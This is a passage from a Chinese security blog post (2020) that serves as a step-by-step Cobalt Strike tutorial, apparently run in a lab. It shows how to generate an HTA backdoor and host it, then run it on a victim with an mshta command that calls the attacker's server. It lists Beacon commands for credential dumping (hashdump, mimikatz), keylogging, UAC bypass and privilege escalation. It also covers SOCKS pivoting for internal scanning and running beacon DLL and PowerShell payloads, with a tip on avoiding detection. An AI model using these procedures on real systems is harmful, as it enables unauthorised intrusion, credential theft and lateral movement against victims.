<li>Smart Applet Attack   # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</li>
<li>System Profiler   # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</li>
</ol>
<p><strong>Spear Phish</strong>   # 鱼叉钓鱼邮件</p>
<h3 id="0x24-Reporting"><a href="#0x24-Reporting" class="headerlink" title="0x24 Reporting"></a>0x24 Reporting</h3><ol>
<li>Activity Report   # 活动报告</li>
<li>Hosts Report   # 主机报告</li>
<li>Indicators of Compromise   # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</li>
<li>Sessions Report   # 会话报告</li>
<li>Social Engineering Report   # 社会工程报告：包括鱼叉钓鱼邮件及点击记录</li>
<li>Tactics, Techniques, and Procedures   # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</li>
</ol>
<p><strong>Reset Data</strong>   # 重置数据<br><strong>Export Data</strong>   # 导出数据，导出.tsv文件格式</p>
<h3 id="0x25-Help"><a href="#0x25-Help" class="headerlink" title="0x25 Help"></a>0x25 Help</h3><ol>
<li>Homepage   # 官方主页</li>
<li>Support   # 技术支持</li>
<li>Arsenal   # 开发者</li>
<li>System information   # 版本信息</li>
<li>About   # 关于</li>
</ol>
<h3 id="0x26-各按钮快捷键"><a href="#0x26-各按钮快捷键" class="headerlink" title="0x26 各按钮快捷键"></a>0x26 各按钮快捷键</h3><p><img src="/CobaltStrike/7.png" alt></p>
<ol>
<li>新建连接</li>
<li>断开当前连接</li>
<li>监听器</li>
<li>改变视图为Pivot Graph(视图列表)</li>
<li>改变视图为Session Table(会话列表)</li>
<li>改变视图为Target Table(目标列表)</li>
<li>显示所有以获取的受害主机的凭证</li>
<li>查看已下载文件</li>
<li>查看键盘记录结果</li>
<li>查看屏幕截图</li>
<li>生成无状态的可执行exe木马</li>
<li>使用java自签名的程序进行钓鱼攻击</li>
<li>生成office宏病毒文件</li>
<li>为payload提供web服务以便下载和执行</li>
<li>提供文件下载，可以选择Mime类型</li>
<li>管理Cobalt Strike上运行的web服务</li>
<li>帮助</li>
<li>关于</li>
</ol>
<h2 id="0x30-基本使用"><a href="#0x30-基本使用" class="headerlink" title="0x30 基本使用"></a>0x30 基本使用</h2><h3 id="0x31-创建监听器"><a href="#0x31-创建监听器" class="headerlink" title="0x31 创建监听器"></a>0x31 创建监听器</h3><ol>
<li>Cobalt Strike——Listeners——Add</li>
<li><img src="/CobaltStrike/8.png" alt></li>
<li>共9个listener</li>
<li>windows/beacon_dns/reverse_dns_txt</li>
<li>windows/beacon_dns/reverse_http</li>
<li>windows/beacon_http/reverse_http</li>
<li>windows/beacon_https/reverse_https</li>
<li>windows/beacon_smb/bind_pipe</li>
<li>windows/foreign/reverse_dns_txt</li>
<li>windows/foreign/reverse_http</li>
<li>windows/foreign/reverse_https</li>
<li>windows/foreign/reverse_tcp</li>
<li>这里name随意，选windows/beacon_http/reverse_http，host默认，port为不在使用中的端口，save</li>
<li><img src="/CobaltStrike/9.png" alt></li>
<li>确定</li>
<li><img src="/CobaltStrike/10.png" alt></li>
<li>已建立监听，确定</li>
<li><img src="/CobaltStrike/11.png" alt></li>
</ol>
<h3 id="0x32-创建木马文件"><a href="#0x32-创建木马文件" class="headerlink" title="0x32 创建木马文件"></a>0x32 创建木马文件</h3><ol>
<li>Attacks——Packages——HTML Application——Listener选刚创建的监听名称test（如果没有则点Add新建监听器）——method这里选powershell——Generate</li>
<li><img src="/CobaltStrike/12.png" alt></li>
<li><img src="/CobaltStrike/13.png" alt></li>
<li>自选保存路径</li>
<li><img src="/CobaltStrike/14.png" alt></li>
</ol>
<h3 id="0x33-开启web服务"><a href="#0x33-开启web服务" class="headerlink" title="0x33 开启web服务"></a>0x33 开启web服务</h3><ol>
<li>Attacks——Web Drive-by——Host File</li>
<li><img src="/CobaltStrike/15.png" alt></li>
<li>File选刚生成的evil.hta——其他默认，Launch</li>
<li><img src="/CobaltStrike/16.png" alt></li>
<li>生成了下载链接</li>
<li><img src="/CobaltStrike/17.png" alt></li>
</ol>
<h3 id="0x34-运行木马"><a href="#0x34-运行木马" class="headerlink" title="0x34 运行木马"></a>0x34 运行木马</h3><ol>
<li>被攻击机运行mshta命令：mshta <a href="http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）" target="_blank" rel="noopener">http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）</a></li>
<li><img src="/CobaltStrike/18.png" alt></li>
<li>查看CS，已经有显示被攻击机在线</li>
<li><img src="/CobaltStrike/19.png" alt></li>
<li>右击——Interact，就可以进行交互</li>
<li><img src="/CobaltStrike/20.png" alt></li>
<li>sleep 5 #因为默认60秒回传一次，这里设置为5秒（可以设置为0秒，真实环境中，太快容易被发现）</li>
<li><img src="/CobaltStrike/21.png" alt></li>
</ol>
<h3 id="0x35-导出报告"><a href="#0x35-导出报告" class="headerlink" title="0x35 导出报告"></a>0x35 导出报告</h3><ol>
<li>Reporting——Activity Report——默认PDF格式</li>
<li><img src="/CobaltStrike/22.png" alt></li>
<li><img src="/CobaltStrike/23.png" alt></li>
</ol>
<h2 id="0x40-Beacon"><a href="#0x40-Beacon" class="headerlink" title="0x40 Beacon"></a>0x40 Beacon</h2><h3 id="0x41-查看帮助"><a href="#0x41-查看帮助" class="headerlink" title="0x41 查看帮助"></a>0x41 查看帮助</h3><pre><code>beacon&gt; help

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for matching processes 进程参数欺骗
    blockdlls                 Block non-Microsoft DLLs in child processes 在子进程中阻止非Microsoft的DLLs文件
    browserpivot              Setup a browser pivot session 注入被攻击者浏览器进程
    bypassuac                 Spawn a session in a high integrity process 绕过UAC
    cancel                    Cancel a download that&#39;s in-progress 取消正在进行的下载
    cd                        Change directory 切换目录
    checkin                   Call home and post data 强制让被控端回连一次
    clear                     Clear beacon queue 清除beacon内部的任务队列
    connect                   Connect to a Beacon peer over TCP 通过TCP连接到Beacon
    covertvpn                 Deploy Covert VPN client 部署Covert VPN客户端
    cp                        Copy a file 复制文件
    dcsync                    Extract a password hash from a DC 从DC中提取密码哈希
    desktop                   View and interact with target&#39;s desktop 远程VNC
    dllinject                 Inject a Reflective DLL into a process 反射DLL注入进程
    dllload                   Load DLL into a process with LoadLibrary() 使用LoadLibrary将DLL加载到进程中
    download                  Download a file 下载文件
    downloads                 Lists file downloads in progress 列出正在进行的文件下载
    drives                    List drives on target 列出目标盘符
    elevate                   Try to elevate privileges 尝试提权
    execute                   Execute a program on target (no output) 在目标上执行程序(无输出)
    execute-assembly          Execute a local .NET program in-memory on target 在目标上内存中执行本地.NET程序
    exit                      Terminate the beacon session 退出beacon
    getprivs                  Enable system privileges on current token 对当前令牌启用系统权限
    getsystem                 Attempt to get SYSTEM 尝试获取SYSTEM权限
    getuid                    Get User ID 获取用户ID
    hashdump                  Dump password hashes 转储密码哈希值
    help                      Help menu 帮助
    inject                    Spawn a session in a specific process 在特定进程中生成会话
    jobkill                   Kill a long-running post-exploitation task 杀死一个后台任务
    jobs                      List long-running post-exploitation tasks 列出后台任务
    kerberos_ccache_use       Apply kerberos ticket from cache to this session 从ccache文件中导入票据应用于此会话
    kerberos_ticket_purge     Purge kerberos tickets from this session 清除当前会话的票据
    kerberos_ticket_use       Apply kerberos ticket to this session 从ticket文件中导入票据应用于此会话
    keylogger                 Inject a keystroke logger into a process 键盘记录
    kill                      Kill a process 结束进程
    link                      Connect to a Beacon peer over a named pipe 通过命名管道连接到Beacon
    logonpasswords            Dump credentials and hashes with mimikatz 使用mimikatz转储凭据和哈希值
    ls                        List files 列出文件
    make_token                Create a token to pass credentials 创建令牌以传递凭据
    mimikatz                  Runs a mimikatz command 运行mimikatz
    mkdir                     Make a directory 创建一个目录
    mode dns                  Use DNS A as data channel (DNS beacon only) 使用DNS A作为通信通道(仅限DNS beacon)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only) 使用DNS TXT作为通信通道(仅限D beacon)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only) 使用DNS AAAA作为通信通道(仅限DNS beacon)
    mode http                 Use HTTP as data channel 使用HTTP作为通信通道
    mv                        Move a file 移动文件
    net                       Network and host enumeration tool net命令
    note                      Assign a note to this Beacon 给当前目标机器备注
    portscan                  Scan a network for open services 进行端口扫描
    powerpick                 Execute a command via Unmanaged PowerShell 通过Unmanaged PowerShell执行命令
    powershell                Execute a command via powershell.exe 通过powershell.exe执行命令
    powershell-import         Import a powershell script 导入powershell脚本
    ppid                      Set parent PID for spawned post-ex jobs 为生成的post-ex任务设置父PID
    ps                        Show process list 显示进程列表
    psexec                    Use a service to spawn a session on a host 使用服务在主机上生成会话
    psexec_psh                Use PowerShell to spawn a session on a host 使用PowerShell在主机上生成会话
    psinject                  Execute PowerShell command in specific process 在特定进程中执行PowerShell命令
    pth                       Pass-the-hash using Mimikatz 使用Mimikatz进行传递哈希
    pwd                       Print current directory 当前目录位置
    reg                       Query the registry 查询注册表
    rev2self                  Revert to original token 恢复原始令牌
    rm                        Remove a file or folder 删除文件或文件夹
    rportfwd                  Setup a reverse port forward 端口转发
    run                       Execute a program on target (returns output) 在目标上执行程序(返回输出)
    runas                     Execute a program as another user  以另一个用户权限执行程序
    runasadmin                Execute a program in a high-integrity context 在高权限下执行程序
    runu                      Execute a program under another PID 在另一个PID下执行程序
    screenshot                Ta 将shellcode注入进程ke a screenshot 屏幕截图
    setenv                    Set an environment variable  设置环境变量
    shell                     Execute a command via cmd.exe cmd执行命令
    shinject                  Inject shellcode into a process 将shellcode注入进程
    shspawn                   Spawn process and inject shellcode into it 生成进程并将shellcode注入其中
    sleep                     Set beacon sleep time 设置睡眠延迟时间
    socks                     Start SOCKS4a server to relay traffic 启动SOCKS4代理
    socks stop                Stop SOCKS4a server 停止SOCKS4
    spawn                     Spawn a session 生成一个会话
    spawnas                   Spawn a session as another user 以其他用户身份生成会话
    spawnto                   Set executable to spawn processes into 将可执行程序注入进程
    spawnu                    Spawn a session under another PID 在另一个PID下生成会话
    ssh                       Use SSH to spawn an SSH session on a host 使用ssh连接远程主机
    ssh-key                   Use SSH to spawn an SSH session on a host 使用密钥连接远程主机
    steal_token               Steal access token from a process 从进程中窃取令牌
    timestomp                 Apply timestamps from one file to another 将一个文件时间戳应用到另一个文件
    unlink                    Disconnect from parent Beacon 断开与Beacon的连接
    upload                    Upload a file 上传文件
    wdigest                   Dump plaintext credentials with mimikatz 使用mimikatz转储明文凭据
    winrm                     Use WinRM to spawn a session on a host 使用WinRM在主机上生成会话
    wmi                       Use WMI to spawn a session on a host 使用WMI在主机上生成会话</code></pre><h3 id="0x42-具体命令的帮助信息"><a href="#0x42-具体命令的帮助信息" class="headerlink" title="0x42 具体命令的帮助信息"></a>0x42 具体命令的帮助信息</h3><ol>
<li>help shell</li>
<li><img src="/CobaltStrike/24.png" alt></li>
<li></li>
<li><strong>hashdump</strong> #获取hash</li>
<li><img src="/CobaltStrike/37.png" alt></li>
<li></li>
<li>logonpasswords</li>
<li><img src="/CobaltStrike/38.png" alt></li>
<li><img src="/CobaltStrike/39.png" alt></li>
<li>同样可按键</li>
<li><img src="/CobaltStrike/40.png" alt></li>
<li></li>
<li><strong>其他命令</strong></li>
<li>pwd</li>
<li>getuid</li>
<li>ls</li>
<li>net user</li>
<li>net localgroup</li>
<li>net logons</li>
<li>screenshot #截图，保存到服务端日志文件夹里</li>
<li><img src="/CobaltStrike/41.png" alt></li>
<li>shell ipconfig</li>
<li>ps</li>
<li>keylogger pid</li>
<li>Keystrokes #查看键盘记录</li>
<li>shell dir</li>
<li>elevate #查看模块</li>
<li>elevate ms15-051 http beacon #加载模块</li>
</ol>
<h3 id="0x43-MSF"><a href="#0x43-MSF" class="headerlink" title="0x43 MSF"></a>0x43 MSF</h3><ol>
<li>新建监听器</li>
<li><img src="/CobaltStrike/46.png" alt> </li>
<li><img src="/CobaltStrike/47.png" alt></li>
<li>选择刚新建的监听器</li>
<li><img src="/CobaltStrike/48.png" alt></li>
<li>启动MSF，并设置监听，当前面选choose时，msf就获取到session</li>
<li><img src="/CobaltStrike/49.png" alt></li>
</ol>
<h2 id="0x50-browserpivot"><a href="#0x50-browserpivot" class="headerlink" title="0x50 browserpivot"></a>0x50 browserpivot</h2><ol>
<li>Setup a browser pivot session 注入被攻击者浏览器进程</li>
<li>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</li>
<li>ps #查看进程</li>
<li><img src="/CobaltStrike/25.png" alt></li>
<li>也可以通过图形界面注入，右击——Explore——Browser Pivot</li>
<li><img src="/CobaltStrike/26.png" alt></li>
<li><img src="/CobaltStrike/27.png" alt></li>
<li>然后浏览器设置代理访问</li>
<li><img src="/CobaltStrike/28.png" alt></li>
<li><img src="/CobaltStrike/29.png" alt></li>
</ol>
<h2 id="0x60-Socks代理"><a href="#0x60-Socks代理" class="headerlink" title="0x60 Socks代理"></a>0x60 Socks代理</h2><ol>
<li>开启代理，内网渗透</li>
<li>同样两种方法，命令或右击——Pivoting——SOCKS Server</li>
<li>命令：socks 6666</li>
<li><img src="/CobaltStrike/30.png" alt></li>
<li>然后编辑vim /etc/proxychains.conf，在文件末尾添加socks4代理</li>
<li><img src="/CobaltStrike/31.png" alt></li>
<li>使用proxychains扫内网：proxychains nmap -sP 192.168.100.0/24</li>
<li><img src="/CobaltStrike/32.png" alt></li>
<li>还可以把MSF带进目标内网View——Proxy Pivots——选择Socks4a Proxy——点击Tunnel——setg Proxies socks4:127.0.0.1:6666</li>
<li><img src="/CobaltStrike/33.png" alt></li>
<li>setg Proxies socks4:127.0.0.1:6666</li>
<li><img src="/CobaltStrike/34.png" alt></li>
<li>beacon&gt;socks stop #关闭sock</li>
</ol>
<h2 id="0x70-powershell-import"><a href="#0x70-powershell-import" class="headerlink" title="0x70 powershell-import"></a>0x70 powershell-import</h2><ol>
<li>可以导入各种powershell渗透框架：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a>、<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></li>
<li>beacon&gt;powershell-import #导入ps脚本，来自<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a></li>
<li><img src="/CobaltStrike/35.png" alt></li>
<li><img src="/CobaltStrike/36.png" alt></li>
<li>详细命令可查看cat Powerpreter.psm1 | grep function</li>
</ol>
<h2 id="0x80-dll文件或ps文件"><a href="#0x80-dll文件或ps文件" class="headerlink" title="0x80 dll文件或ps文件"></a>0x80 dll文件或ps文件</h2><ol>
<li>Attacks——Packages——windows Executable(S)</li>
<li><img src="/CobaltStrike/43.png" alt></li>
<li><img src="/CobaltStrike/42.png" alt></li>
<li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.dll</li>
<li><img src="/CobaltStrike/44.png" alt></li>
<li>shell dir</li>
<li><img src="/CobaltStrike/45.png" alt></li>
<li>在被攻击机上执行：regsvr32 beacon.dll</li>
<li></li>
<li>Attacks——Packages——windows Executable(S)</li>
<li><img src="/CobaltStrike/50.png" alt></li>
<li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.ps1</li>
<li>在被攻击机上执行：.\beacon.ps1</li>
<li>执行regsvr32 beacon.dll还是posershell beacon.ps1之后，会话列表就多了一条多*的主机</li>
<li><img src="/CobaltStrike/51.png" alt></li>
</ol>
<h2 id="0x90-内网渗透"><a href="#0x90-内网渗透" class="headerlink" title="0x90 内网渗透"></a>0x90 内网渗透</h2><ol>
<li>bypass UAC</li>
<li><img src="/CobaltStrike/52.png" alt></li>
</ol>
<h2 id="0xA0-各种扫描"><a href="#0xA0-各种扫描" class="headerlink" title="0xA0 各种扫描"></a>0xA0 各种扫描</h2><h3 id="0xA1-存活主机扫描"><a href="#0xA1-存活主机扫描" class="headerlink" title="0xA1 存活主机扫描"></a>0xA1 存活主机扫描</h3><ol>
<li>右击会话——Explore——net view</li>
<li><img src="/CobaltStrike/55.png" alt></li>
</ol>
<h3 id="0xA2-端口扫描"><a href="#0xA2-端口扫描" class="headerlink" title="0xA2 端口扫描"></a>0xA2 端口扫描</h3><ol>
<li>右击会话——Explore——port scan</li>
<li><img src="/CobaltStrike/53.png" alt></li>
<li><img src="/CobaltStrike/54.png" alt></li>
<li>可能没扫到~</li>
<li><img src="/CobaltStrike/56.png" alt></li>
<li>执行扫描端口命令：beacon&gt; portscan 192.168.100.8 1-10000 icmp 1024</li>
<li><img src="/CobaltStrike/57.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></li>
</ol>

      
       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，仅供于知识交流与学习。——网络知识获取、理解、提纯、笔记工程师 </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>CobaltStrike</p>
    
    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
    <p><span class="copy-title">发布时间:</span>2020-01-04, 19:01:40</p>
    <p><span class="copy-title">最后更新:</span>2020-01-05, 02:45:49</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/CobaltStrike/" title="CobaltStrike">https://10fteam.github.io/CobaltStrike/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2020 10fteam</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#CTF','#encrypt_decrypt','#RSA','#工具','#知识','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#PHP','#代码审计','#POC','#EXP','#PWN','#python','#注入','#Struts2','#weblogic','#漏洞','#backdoor','#help','#shell','#靶场','#vulnhub','#僵尸网络','#内网渗透','#share','#提权','#WAF','#MISC','#逆向',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        <!--width: 542px;-->
        width: 270px;
    }
    .nav.fullscreen {
        <!--margin-left: -542px;-->
        margin-left: -270px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
